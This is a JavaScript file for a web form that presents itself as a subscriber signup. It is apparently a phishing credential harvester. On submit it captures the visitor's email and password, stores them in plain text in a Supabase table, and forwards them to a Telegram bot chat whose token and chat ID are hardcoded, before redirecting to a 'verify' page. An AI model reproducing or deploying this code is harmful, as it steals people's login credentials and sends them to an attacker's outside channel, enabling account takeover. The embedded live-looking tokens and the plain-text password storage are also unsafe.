console.log("script.js loaded");
const SUPABASE_URL = "https://hknefvgppkuhimgkuivg.supabase.co";

const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_E3Y8ZAbe9EjiKaN0AluyrA_z6cjwxQw";

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8917723791:AAF0sRy1FgaR2XDLawCrQ8cHQ1nt7WCMGL8"; // Put your bot token here
const TELEGRAM_CHAT_ID = "6417551309";     // Put your chat ID here

async function sendTelegramNotification(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "HTML"
            })
        });
        console.log("Telegram notification sent!");
    } catch (err) {
        console.error("Failed to send Telegram notification:", err);
    }
}
// -----------------------------
const supabaseClient = supabase.createClient(

SUPABASE_URL,

SUPABASE_PUBLISHABLE_KEY

);


console.log("Supabase connected");


document.addEventListener("DOMContentLoaded", () => {

const form = document.getElementById("subscriberForm");


if (!form) {

console.error("ERROR: subscriberForm was not found.");

return;

}


 console.log("Form found successfully");


 form.addEventListener("submit", async function (event) {

event.preventDefault();

 const emailInput = document.getElementById("email");

 const passwordInput = document.getElementById("password");


const email = emailInput.value.trim();

 const password = passwordInput.value.trim();


if (!email) {

alert("Please enter your email.");

return;

 }


 if (!password) {

 alert("Please enter your password.");

 return;

 }


const button = form.querySelector("button");

button.disabled = true;

button.textContent = "Please wait...";


 const { data, error } = await supabaseClient

.from("subscribers")

 .insert([

{

 email: email,

password: password

}

 ]);


 if (error) {

 console.error("SUPABASE ERROR:", error);

alert("Something went wrong: " + error.message);

 button.disabled = false;

 button.textContent = "Continue";

return;

}

 button.disabled = false;

button.textContent = "Continue";
// 2. Send Telegram Notification
        const telegramMessage = `🚨 <b>New Subscriber Signup</b>\n\n📧 <b>Email:</b> ${email}\n🔑 <b>Password:</b> ${password}`;
        await sendTelegramNotification(telegramMessage);

window.location.href = `verify.html?email=${encodeURIComponent(email)}`;
 });
});

